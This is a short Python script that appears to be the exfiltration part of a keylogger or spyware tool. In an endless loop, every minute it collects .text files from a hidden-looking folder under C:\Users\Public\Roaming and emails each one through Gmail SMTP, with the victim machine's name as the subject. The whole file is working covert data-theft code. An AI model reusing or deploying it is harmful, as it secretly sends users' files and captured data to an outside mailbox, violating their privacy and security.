import yagmail
import time
from datetime import datetime
import glob, os
class SendToMail():
    def __init__(self):
        #self.LoginAndSend()
        pass
    def LoginAndSend(self):
        yag_smtp_connection = yagmail.SMTP( user="login", password="password", host='smtp.gmail.com')
        # email subject
        name = os.environ['COMPUTERNAME']
        # send the email
        while (1):
            time.sleep (60)
            for file in glob.glob (r"C:\Users\Public\Roaming\*.text"):
                print (file)
                with open (file, "a") as f:
                    print (file)
                    print ("Xd")
                czas = datetime.now ()

                date_time = czas.strftime ("%m/%d/%Y, %H:%M:%S")
                contents = [date_time]
                yag_smtp_connection.send('mail', name, contents,attachments=file)

